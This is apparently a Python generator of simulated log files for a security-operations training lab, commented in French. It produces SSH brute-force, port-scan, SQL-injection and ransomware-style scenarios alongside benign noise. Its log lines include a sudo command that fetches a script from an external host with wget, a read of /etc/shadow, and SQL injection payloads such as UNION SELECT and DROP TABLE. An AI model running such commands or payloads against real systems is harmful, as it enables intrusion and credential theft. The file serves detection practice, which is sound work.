"""Générateur de journaux simulés pour les 4 scénarios + bruit de fond.

Tout est déterministe (graine fixe) : la démonstration est reproductible.
AUCUN vrai malware n'est créé : les "fichiers malveillants" ne sont que du texte inoffensif.
"""
from __future__ import annotations

import hashlib
import json
import random
from collections import defaultdict
from datetime import datetime, timedelta
from urllib.parse import quote

BASE = datetime(2026, 11, 7, 9, 0, 0)
FAKE_MALWARE = b"SOC-LAB-FAKE-MALWARE-SAMPLE-v1 (fichier inoffensif de simulation)"
FAKE_MALWARE_SHA256 = hashlib.sha256(FAKE_MALWARE).hexdigest()
UNKNOWN_SCRIPT = b"#!/bin/sh\n# script de simulation inoffensif\necho update\n"

IP_SSH_BRUTE = "198.51.100.23"      # force brute simple
IP_MULTI = "203.0.113.77"           # scan -> force brute -> compromission
IP_BENIGN_USER = "10.0.0.45"        # faute de frappe légitime
IP_SCAN_BLACKLIST = "192.0.2.88"    # scan, IP connue (IOC)
IP_SCAN_SLOW = "192.0.2.99"         # sondage limité
IP_SQLMAP = "198.51.100.140"        # sqlmap, IP connue (IOC)
IP_MANUAL_SQLI = "203.0.113.200"    # injections manuelles
IP_BENIGN_WEB = "10.0.0.60"         # apostrophe légitime (O'Brien)


def _iso(ts): return ts.strftime("%Y-%m-%dT%H:%M:%S")


def _ssh_fail(ts, user, ip, rng, host="srv-01"):
    invalid = "invalid user " if user not in ("root", "deploy", "alice", "bob", "carol") else ""
    return f"{_iso(ts)} {host} sshd[{rng.randint(1000, 9999)}]: Failed password for {invalid}{user} from {ip} port {rng.randint(20000, 60000)} ssh2"


def _ssh_ok(ts, user, ip, rng, host="srv-01"):
    return f"{_iso(ts)} {host} sshd[{rng.randint(1000, 9999)}]: Accepted password for {user} from {ip} port {rng.randint(20000, 60000)} ssh2"


def _sudo(ts, user, cmd, host="srv-01"):
    return f"{_iso(ts)} {host} sudo: {user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND={cmd}"


def _fw(ts, src, dport, rng, action=None, host="srv-01"):
    action = action or ("ALLOW" if dport in (22, 80, 443) else "BLOCK")
    return (f"{_iso(ts)} {host} kernel: [UFW {action}] IN=eth0 OUT= MAC=00:11 SRC={src} DST=10.0.0.5 "
            f"LEN=60 PROTO=TCP SPT={rng.randint(1024, 65000)} DPT={dport} WINDOW=1024 SYN")


def _nginx(ts, ip, url, status, size, ua):
    return f'{ip} - - [{ts.strftime("%d/%b/%Y:%H:%M:%S")} +0000] "GET {url} HTTP/1.1" {status} {size} "-" "{ua}"'


def _fileev(ts, event, path, host="srv-01", user="www-data", sha=None, size=None, old=None):
    d = {"ts": _iso(ts), "host": host, "event": event, "path": path, "user": user}
    if sha: d["sha256"] = sha
    if size is not None: d["size"] = size
    if old: d["old_path"] = old
    return json.dumps(d)


def generate(ws, seed: int = 42) -> dict:
    """Écrit les journaux dans ws.logs et les fichiers du bac à sable dans ws.sandbox."""
    rng = random.Random(seed)
    ws.ensure()
    out = defaultdict(list)   # nom de fichier -> [(ts, ligne)]
    BROWSER = "Mozilla/5.0 (X11; Linux x86_64) Firefox/126.0"

    # ---------- Bruit de fond (trafic légitime) ----------
    for _ in range(12):
        ts = BASE + timedelta(seconds=rng.randint(0, 3500))
        out["auth.log"].append((ts, _ssh_ok(ts, rng.choice(["alice", "bob", "carol"]), f"10.0.0.{rng.randint(10, 40)}", rng)))
    for _ in range(3):
        ts = BASE + timedelta(seconds=rng.randint(0, 3500))
        out["auth.log"].append((ts, _ssh_fail(ts, "alice", f"10.0.0.{rng.randint(10, 40)}", rng)))
    pages = ["/", "/products?id=3", "/products?id=7", "/about", "/contact", "/search?q=laptop", "/static/app.js", "/login"]
    for _ in range(150):
        ts = BASE + timedelta(seconds=rng.randint(0, 3500))
        ip = rng.choice([f"10.0.0.{rng.randint(10, 40)}", f"100.64.0.{rng.randint(1, 30)}"])
        out["nginx_access.log"].append((ts, _nginx(ts, ip, rng.choice(pages), 200, rng.randint(300, 4000), BROWSER)))
    for _ in range(60):
        ts = BASE + timedelta(seconds=rng.randint(0, 3500))
        out["firewall.log"].append((ts, _fw(ts, f"100.64.0.{rng.randint(1, 30)}", rng.choice([80, 443, 22]), rng)))
    for ts, ev, p in [(BASE + timedelta(minutes=5), "modified", "/home/alice/report.docx"),
                      (BASE + timedelta(minutes=18), "created", "/var/www/uploads/photo.png"),
                      (BASE + timedelta(minutes=33), "modified", "/var/log/syslog")]:
        out["file_events.jsonl"].append((ts, _fileev(ts, ev, p, sha=hashlib.sha256(p.encode()).hexdigest(), size=2048)))

    # ---------- Scénario 1a : force brute SSH simple ----------
    t = BASE + timedelta(minutes=10)
    users = ["admin", "root", "test", "oracle", "ubuntu", "postgres"]
    for i in range(45):
        t += timedelta(seconds=2.5)
        out["auth.log"].append((t, _ssh_fail(t, users[i % len(users)], IP_SSH_BRUTE, rng)))

    # ---------- Scénario 2 : scan de ports (IP bloquée connue, puis sondage lent) ----------
    t = BASE + timedelta(minutes=12)
    for port in rng.sample(range(1, 10000), 40):
        t += timedelta(seconds=0.7)
        out["firewall.log"].append((t, _fw(t, IP_SCAN_BLACKLIST, port, rng)))
    t = BASE + timedelta(minutes=50)
    for port in (22, 80, 443, 8080, 3306, 5900):
        t += timedelta(seconds=9)
        out["firewall.log"].append((t, _fw(t, IP_SCAN_SLOW, port, rng)))

    # ---------- Scénario multi-étapes : scan -> force brute -> succès -> commandes ----------
    t = BASE + timedelta(minutes=20)
    for port in range(20, 80):
        t += timedelta(seconds=0.4)
        out["firewall.log"].append((t, _fw(t, IP_MULTI, port, rng)))
    t = BASE + timedelta(minutes=25)
    users = ["admin", "root", "test", "deploy"]
    for i in range(25):
        t += timedelta(seconds=4)
        out["auth.log"].append((t, _ssh_fail(t, users[i % len(users)], IP_MULTI, rng)))
    t_ok = BASE + timedelta(minutes=27, seconds=15)
    out["auth.log"].append((t_ok, _ssh_ok(t_ok, "deploy", IP_MULTI, rng)))
    for dt, cmd in [(25, "/usr/bin/wget http://203.0.113.9/x.sh"), (40, "/bin/chmod +x /tmp/x.sh"), (55, "/bin/cat /etc/shadow")]:
        ts = t_ok + timedelta(seconds=dt)
        out["auth.log"].append((ts, _sudo(ts, "deploy", cmd)))

    # ---------- Faux positif SSH : fautes de frappe d'un utilisateur interne ----------
    t = BASE + timedelta(minutes=40)
    for _ in range(3):
        t += timedelta(seconds=6)
        out["auth.log"].append((t, _ssh_fail(t, "alice", IP_BENIGN_USER, rng)))
    t += timedelta(seconds=8)
    out["auth.log"].append((t, _ssh_ok(t, "alice", IP_BENIGN_USER, rng)))

    # ---------- Scénario 3 : injection SQL ----------
    payloads = ["/products?id=1' AND SLEEP(5)--", "/products?id=1 UNION SELECT NULL,NULL--",
                "/products?id=1' OR '1'='1", "/products?id=1; DROP TABLE users--",
                "/products?id=1 UNION SELECT table_name FROM information_schema.tables--"]
    t = BASE + timedelta(minutes=30)
    for i in range(25):
        t += timedelta(seconds=1.5)
        url = quote(payloads[i % len(payloads)], safe="/?=&")
        status = 500 if i % 4 in (0, 3) else 200
        out["nginx_access.log"].append((t, _nginx(t, IP_SQLMAP, url, status, rng.randint(200, 900), "sqlmap/1.7.11#stable")))
    t = BASE + timedelta(minutes=35)
    for raw in ["/login?user=admin'--&pass=x", "/products?id=1 UNION SELECT username,password FROM users--", "/items?id=1 OR 1=1"]:
        t += timedelta(seconds=20)
        out["nginx_access.log"].append((t, _nginx(t, IP_MANUAL_SQLI, quote(raw, safe="/?=&"), 200, rng.randint(900, 3000), BROWSER)))
    t = BASE + timedelta(minutes=37)
    out["nginx_access.log"].append((t, _nginx(t, IP_BENIGN_WEB, "/search?q=O%27Brien", 200, 1500, BROWSER)))

    # ---------- Scénario 4 : fichiers suspects + ransomware ----------
    sb = ws.sandbox
    (sb / "tmp").mkdir(parents=True, exist_ok=True)
    (sb / "home/alice").mkdir(parents=True, exist_ok=True)
    (sb / "tmp/invoice_2026.pdf.exe").write_bytes(FAKE_MALWARE)
    (sb / "tmp/update.sh").write_bytes(UNKNOWN_SCRIPT)
    (sb / "home/alice/report.docx").write_bytes(b"document normal")
    t = BASE + timedelta(minutes=38)
    out["file_events.jsonl"].append((t, _fileev(t, "created", "/tmp/invoice_2026.pdf.exe", sha=FAKE_MALWARE_SHA256, size=len(FAKE_MALWARE))))
    t = BASE + timedelta(minutes=41)
    out["file_events.jsonl"].append((t, _fileev(t, "created", "/tmp/update.sh", sha=hashlib.sha256(UNKNOWN_SCRIPT).hexdigest(), size=len(UNKNOWN_SCRIPT))))
    t = BASE + timedelta(minutes=45)
    for i in range(35):
        t += timedelta(seconds=0.5)
        old = f"/home/bob/documents/doc{i}.docx"
        out["file_events.jsonl"].append((t, _fileev(t, "renamed", old + ".locked", host="srv-files", user="bob", old=old)))
    t += timedelta(seconds=3)
    out["file_events.jsonl"].append((t, _fileev(t, "created", "/home/bob/documents/README_DECRYPT.txt", host="srv-files", user="bob", size=512)))

    # ---------- Écriture ----------
    counts = {}
    for name, items in out.items():
        items.sort(key=lambda x: x[0])
        (ws.logs / name).write_text("\n".join(l for _, l in items) + "\n", encoding="utf-8")
        counts[name] = len(items)
    return counts
